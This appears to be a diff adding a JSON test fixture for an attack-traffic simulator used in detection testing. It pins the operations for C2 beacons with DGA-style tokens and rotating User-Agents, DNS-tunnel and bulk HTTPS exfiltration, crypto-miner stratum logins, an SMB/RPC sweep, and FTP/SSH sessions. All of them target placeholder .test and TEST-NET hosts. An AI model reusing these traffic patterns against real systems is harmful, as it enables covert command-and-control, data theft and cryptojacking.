@@ -1,0 +1,484 @@
+{
+  "version": 1,
+  "about": "Pinned network operations for each EAL network-shape plugin a beacon can perform (core/eal_simulator/wire_plan.py). Each case gives a plugin, its params and a seed; `ops` is what the renderer must produce and what the beacon must perform, in order; `allowlist` is every destination those operations touch. Read by tests/eal_simulator/test_wire_plan.py and agent/ealrelay/ops_test.go. Hosts are .test names and TEST-NET addresses: nothing here is ever contacted.",
+  "cases": [
+    {
+      "name": "c2_http_beacon: GET with a DGA query token and jittered sleeps",
+      "plugin": "c2_http_beacon",
+      "params": {
+        "target_url": "http://c2.example.test:8080/checkin",
+        "iterations": 3,
+        "sleep_seconds": 2,
+        "jitter_pct": 25,
+        "method": "GET",
+        "dga_query_param": true
+      },
+      "target_allowlist": [
+        "c2.example.test"
+      ],
+      "seed": 7,
+      "campaign_id": "CMP-SPEC-001",
+      "simulation_run_id": "cortexsim-spec-0001",
+      "ops": [
+        {
+          "op": "http",
+          "method": "GET",
+          "url": "http://c2.example.test:8080/checkin?q=jzde8gxd6ncf",
+          "headers": {
+            "X-Simulation-Run-ID": "cortexsim-spec-0001",
+            "X-Simulation-Campaign-ID": "CMP-SPEC-001",
+            "X-Simulation-Source": "cortexsim-eal-simulator/1.0",
+            "User-Agent": "curl/7.68.0 CortexSim/1.0"
+          },
+          "timeout_s": 10.0,
+          "verify_tls": false
+        },
+        {
+          "op": "sleep",
+          "seconds": 1.934
+        },
+        {
+          "op": "http",
+          "method": "GET",
+          "url": "http://c2.example.test:8080/checkin?q=pf91dhodzdoc",
+          "headers": {
+            "X-Simulation-Run-ID": "cortexsim-spec-0001",
+            "X-Simulation-Campaign-ID": "CMP-SPEC-001",
+            "X-Simulation-Source": "cortexsim-eal-simulator/1.0",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; CortexSimBeacon/1.0)"
+          },
+          "timeout_s": 10.0,
+          "verify_tls": false
+        },
+        {
+          "op": "sleep",
+          "seconds": 2.057
+        },
+        {
+          "op": "http",
+          "method": "GET",
+          "url": "http://c2.example.test:8080/checkin?q=s0j8ht9lgmxg",
+          "headers": {
+            "X-Simulation-Run-ID": "cortexsim-spec-0001",
+            "X-Simulation-Campaign-ID": "CMP-SPEC-001",
+            "X-Simulation-Source": "cortexsim-eal-simulator/1.0",
+            "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; CortexSimBeacon/1.0)"
+          },
+          "timeout_s": 10.0,
+          "verify_tls": false
+        }
+      ],
+      "allowlist": [
+        "c2.example.test:8080"
+      ]
+    },
+    {
+      "name": "c2_http_beacon: POST with a random body, fixed User-Agent, no jitter",
+      "plugin": "c2_http_beacon",
+      "params": {
+        "target_url": "https://c2.example.test/submit",
+        "iterations": 2,
+        "sleep_seconds": 1,
+        "jitter_pct": 0,
+        "method": "POST",
+        "body_size_bytes": 512,
+        "dga_query_param": false,
+        "user_agents": [
+          "CortexSimBeacon/1.0"
+        ]
+      },
+      "target_allowlist": [
+        "c2.example.test"
+      ],
+      "seed": 11,
+      "campaign_id": "CMP-SPEC-002",
+      "simulation_run_id": "cortexsim-spec-0002",
+      "ops": [
+        {
+          "op": "http",
+          "method": "POST",
+          "url": "https://c2.example.test/submit",
+          "headers": {
+            "X-Simulation-Run-ID": "cortexsim-spec-0002",
+            "X-Simulation-Campaign-ID": "CMP-SPEC-002",
+            "X-Simulation-Source": "cortexsim-eal-simulator/1.0",
+            "User-Agent": "CortexSimBeacon/1.0"
+          },
+          "timeout_s": 10.0,
+          "verify_tls": false,
+          "body_random_bytes": 512
+        },
+        {
+          "op": "sleep",
+          "seconds": 1.0
+        },
+        {
+          "op": "http",
+          "method": "POST",
+          "url": "https://c2.example.test/submit",
+          "headers": {
+            "X-Simulation-Run-ID": "cortexsim-spec-0002",
+            "X-Simulation-Campaign-ID": "CMP-SPEC-002",
+            "X-Simulation-Source": "cortexsim-eal-simulator/1.0",
+            "User-Agent": "CortexSimBeacon/1.0"
+          },
+          "timeout_s": 10.0,
+          "verify_tls": false,
+          "body_random_bytes": 512
+        }
+      ],
+      "allowlist": [
+        "c2.example.test:443"
+      ]
+    },
+    {
+      "name": "dns_tunnel_exfil: TXT queries to a named resolver",
+      "plugin": "dns_tunnel_exfil",
+      "params": {
+        "base_domain": "exfil.example.test",
+        "chunks": 3,
+        "chunk_size_bytes": 8,
+        "sleep_seconds": 0.5,
+        "encoding": "base32",
+        "query_type": "TXT",
+        "resolver": "192.0.2.53"
+      },
+      "target_allowlist": [
+        "exfil.example.test",
+        "192.0.2.53"
+      ],
+      "seed": 13,
+      "campaign_id": "CMP-SPEC-003",
+      "simulation_run_id": "cortexsim-spec-0003",
+      "ops": [
+        {
+          "op": "dns",
+          "qname": "pnqu4qukdbxuu.exfil-0000.exfil.example.test",
+          "qtype": "TXT",
+          "resolver": "192.0.2.53:53"
+        },
+        {
+          "op": "sleep",
+          "seconds": 0.5
+        },
+        {
+          "op": "dns",
+          "qname": "jqiw3l2jt7l6q.exfil-0001.exfil.example.test",
+          "qtype": "TXT",
+          "resolver": "192.0.2.53:53"
+        },
+        {
+          "op": "sleep",
+          "seconds": 0.5
+        },
+        {
+          "op": "dns",
+          "qname": "bx7b7l2cfvim2.exfil-0002.exfil.example.test",
+          "qtype": "TXT",
+          "resolver": "192.0.2.53:53"
+        }
+      ],
+      "allowlist": [
+        "dns:exfil.example.test",
+        "192.0.2.53:53"
+      ]
+    },
+    {
+      "name": "dns_tunnel_exfil: A queries through the host's own resolver",
+      "plugin": "dns_tunnel_exfil",
+      "params": {
+        "base_domain": "exfil.example.test",
+        "chunks": 2,
+        "chunk_size_bytes": 4,
+        "sleep_seconds": 0,
+        "encoding": "hex",
+        "query_type": "A"
+      },
+      "target_allowlist": [
+        "exfil.example.test"
+      ],
+      "seed": 17,
+      "campaign_id": "CMP-SPEC-004",
+      "simulation_run_id": "cortexsim-spec-0004",
+      "ops": [
+        {
+          "op": "dns",
+          "qname": "c1bca085.exfil-0000.exfil.example.test",
+          "qtype": "A",
+          "resolver": ""
+        },
+        {
+          "op": "dns",
+          "qname": "abe9066a.exfil-0001.exfil.example.test",
+          "qtype": "A",
+          "resolver": ""
+        }
+      ],
+      "allowlist": [
+        "dns:exfil.example.test"
+      ]
+    },
+    {
+      "name": "stratum_tcp_connect: subscribe and login frames per session",
+      "plugin": "stratum_tcp_connect",
+      "params": {
+        "target_host": "192.0.2.42",
+        "target_port": 3333,
+        "iterations": 2,
+        "sleep_seconds": 1,
+        "idle_seconds": 0.5
+      },
+      "target_allowlist": [
+        "192.0.2.42:3333"
+      ],
+      "seed": 19,
+      "campaign_id": "CMP-SPEC-005",
+      "simulation_run_id": "cortexsim-spec-0005",
+      "ops": [
+        {
+          "op": "tcp",
+          "host": "192.0.2.42",
+          "port": 3333,
+          "timeout_s": 5.0,
+          "probe": false,
+          "frames": [
+            {
+              "send_b64": "eyJpZCI6IDcwOSwgImpzb25ycGMiOiAiMi4wIiwgIm1ldGhvZCI6ICJtaW5pbmcuc3Vic2NyaWJlIiwgInBhcmFtcyI6IFsiWE1SaWcvNi4yMC4wIChMaW51eCB4ODZfNjQpIGxpYnV2LzEuNDIuMCBjb3J0ZXhzaW0tZWFsLXNpbXVsYXRvci8xLjAiXX0K"
+            },
+            {
+              "send_b64": "eyJpZCI6IDg1MjgsICJqc29ucnBjIjogIjIuMCIsICJtZXRob2QiOiAibG9naW4iLCAicGFyYW1zIjogeyJsb2dpbiI6ICJjb3J0ZXhzaW0tdGVzdC13YWxsZXQiLCAicGFzcyI6ICJ4IiwgImFnZW50IjogIlhNUmlnLzYuMjAuMCAoTGludXggeDg2XzY0KSBsaWJ1di8xLjQyLjAgY29ydGV4c2ltLWVhbC1zaW11bGF0b3IvMS4wIn19Cg==",
+              "read": 0.5
+            }
+          ]
+        },
+        {
+          "op": "sleep",
+          "seconds": 1.0
+        },
+        {
+          "op": "tcp",
+          "host": "192.0.2.42",
+          "port": 3333,
+          "timeout_s": 5.0,
+          "probe": false,
+          "frames": [
+            {
+              "send_b64": "eyJpZCI6IDE5NzgsICJqc29ucnBjIjogIjIuMCIsICJtZXRob2QiOiAibWluaW5nLnN1YnNjcmliZSIsICJwYXJhbXMiOiBbIlhNUmlnLzYuMjAuMCAoTGludXggeDg2XzY0KSBsaWJ1di8xLjQyLjAgY29ydGV4c2ltLWVhbC1zaW11bGF0b3IvMS4wIl19Cg=="
+            },
+            {
+              "send_b64": "eyJpZCI6IDgzODEsICJqc29ucnBjIjogIjIuMCIsICJtZXRob2QiOiAibG9naW4iLCAicGFyYW1zIjogeyJsb2dpbiI6ICJjb3J0ZXhzaW0tdGVzdC13YWxsZXQiLCAicGFzcyI6ICJ4IiwgImFnZW50IjogIlhNUmlnLzYuMjAuMCAoTGludXggeDg2XzY0KSBsaWJ1di8xLjQyLjAgY29ydGV4c2ltLWVhbC1zaW11bGF0b3IvMS4wIn19Cg==",
+              "read": 0.5
+            }
+          ]
+        }
+      ],
+      "allowlist": [
+        "192.0.2.42:3333"
+      ]
+    },
+    {
+      "name": "bulk_https_exfil: the volume split across two requests",
+      "plugin": "bulk_https_exfil",
+      "params": {
+        "target_url": "https://exfil.example.test/upload",
+        "total_bytes": 3001,
+        "request_count": 2,
+        "method": "PUT"
+      },
+      "target_allowlist": [
+        "exfil.example.test"
+      ],
+      "seed": 23,
+      "campaign_id": "CMP-SPEC-006",
+      "simulation_run_id": "cortexsim-spec-0006",
+      "ops": [
+        {
+          "op": "http",
+          "method": "PUT",
+          "url": "https://exfil.example.test/upload",
+          "headers": {
+            "X-Simulation-Run-ID": "cortexsim-spec-0006",
+            "X-Simulation-Campaign-ID": "CMP-SPEC-006",
+            "X-Simulation-Source": "cortexsim-eal-simulator/1.0"
+          },
+          "timeout_s": 300.0,
+          "verify_tls": false,
+          "body_random_bytes": 1500
+        },
+        {
+          "op": "http",
+          "method": "PUT",
+          "url": "https://exfil.example.test/upload",
+          "headers": {
+            "X-Simulation-Run-ID": "cortexsim-spec-0006",
+            "X-Simulation-Campaign-ID": "CMP-SPEC-006",
+            "X-Simulation-Source": "cortexsim-eal-simulator/1.0"
+          },
+          "timeout_s": 300.0,
+          "verify_tls": false,
+          "body_random_bytes": 1501
+        }
+      ],
+      "allowlist": [
+        "exfil.example.test:443"
+      ]
+    },
+    {
+      "name": "smb_rpc_sweep: connect probes across a /30",
+      "plugin": "smb_rpc_sweep",
+      "params": {
+        "target_cidr": "192.0.2.0/30",
+        "ports": [
+          445,
+          135
+        ],
+        "inter_host_delay": 0.05
+      },
+      "target_allowlist": [
+        "192.0.2.0/30"
+      ],
+      "seed": 29,
+      "campaign_id": "CMP-SPEC-007",
+      "simulation_run_id": "cortexsim-spec-0007",
+      "ops": [
+        {
+          "op": "tcp",
+          "host": "192.0.2.1",
+          "port": 445,
+          "timeout_s": 1.5,
+          "probe": true,
+          "frames": []
+        },
+        {
+          "op": "tcp",
+          "host": "192.0.2.1",
+          "port": 135,
+          "timeout_s": 1.5,
+          "probe": true,
+          "frames": []
+        },
+        {
+          "op": "sleep",
+          "seconds": 0.05
+        },
+        {
+          "op": "tcp",
+          "host": "192.0.2.2",
+          "port": 445,
+          "timeout_s": 1.5,
+          "probe": true,
+          "frames": []
+        },
+        {
+          "op": "tcp",
+          "host": "192.0.2.2",
+          "port": 135,
+          "timeout_s": 1.5,
+          "probe": true,
+          "frames": []
+        },
+        {
+          "op": "sleep",
+          "seconds": 0.05
+        }
+      ],
+      "allowlist": [
+        "192.0.2.1:445",
+        "192.0.2.1:135",
+        "192.0.2.2:445",
+        "192.0.2.2:135"
+      ]
+    },
+    {
+      "name": "ftp_egress: one cleartext control session",
+      "plugin": "ftp_egress",
+      "params": {
+        "target_host": "192.0.2.21",
+        "target_port": 21,
+        "iterations": 1
+      },
+      "target_allowlist": [
+        "192.0.2.21:21"
+      ],
+      "seed": 31,
+      "campaign_id": "CMP-SPEC-008",
+      "simulation_run_id": "cortexsim-spec-0008",
+      "ops": [
+        {
+          "op": "tcp",
+          "host": "192.0.2.21",
+          "port": 21,
+          "timeout_s": 5.0,
+          "probe": false,
+          "frames": [
+            {
+              "read": 5.0
+            },
+            {
+              "send_b64": "VVNFUiBjb3J0ZXhzaW0NCg==",
+              "read": 0.5
+            },
+            {
+              "send_b64": "UEFTUyBjb3J0ZXhzaW0tbGFiDQo=",
+              "read": 0.5
+            },
+            {
+              "send_b64": "U1lTVA0K",
+              "read": 0.5
+            },
+            {
+              "send_b64": "Tk9PUCBjb3J0ZXhzaW0tZWFsLXNpbXVsYXRvci8xLjANCg==",
+              "read": 0.5
+            },
+            {
+              "send_b64": "UVVJVA0K",
+              "read": 1.5
+            }
+          ]
+        }
+      ],
+      "allowlist": [
+        "192.0.2.21:21"
+      ]
+    },
+    {
+      "name": "ssh_egress: banner and KEXINIT",
+      "plugin": "ssh_egress",
+      "params": {
+        "target_host": "192.0.2.22",
+        "target_port": 22,
+        "iterations": 1
+      },
+      "target_allowlist": [
+        "192.0.2.22:22"
+      ],
+      "seed": 37,
+      "campaign_id": "CMP-SPEC-009",
+      "simulation_run_id": "cortexsim-spec-0009",
+      "ops": [
+        {
+          "op": "tcp",
+          "host": "192.0.2.22",
+          "port": 22,
+          "timeout_s": 5.0,
+          "probe": false,
+          "frames": [
+            {
+              "read": 5.0
+            },
+            {
+              "send_b64": "U1NILTIuMC1Db3J0ZXhTaW1fZWFsXzEuMA0K"
+            },
+            {
+              "send_b64": "AAABFAQU29mXrjnylZujRHMXwLRw7wAAAC9jdXJ2ZTI1NTE5LXNoYTI1NixkaWZmaWUtaGVsbG1hbi1ncm91cDE0LXNoYTI1NgAAABhzc2gtZWQyNTUxOSxyc2Etc2hhMi0yNTYAAAA0Y2hhY2hhMjAtcG9seTEzMDVAb3BlbnNzaC5jb20sYWVzMjU2LWdjbUBvcGVuc3NoLmNvbQAAADRjaGFjaGEyMC1wb2x5MTMwNUBvcGVuc3NoLmNvbSxhZXMyNTYtZ2NtQG9wZW5zc2guY29tAAAADWhtYWMtc2hhMi0yNTYAAAANaG1hYy1zaGEyLTI1NgAAAARub25lAAAABG5vbmUAAAAAAAAAAAAAAAAAQTYpng==",
+              "read": 2.0
+            }
+          ]
+        }
+      ],
+      "allowlist": [
+        "192.0.2.22:22"
+      ]
+    }
+  ]
+}
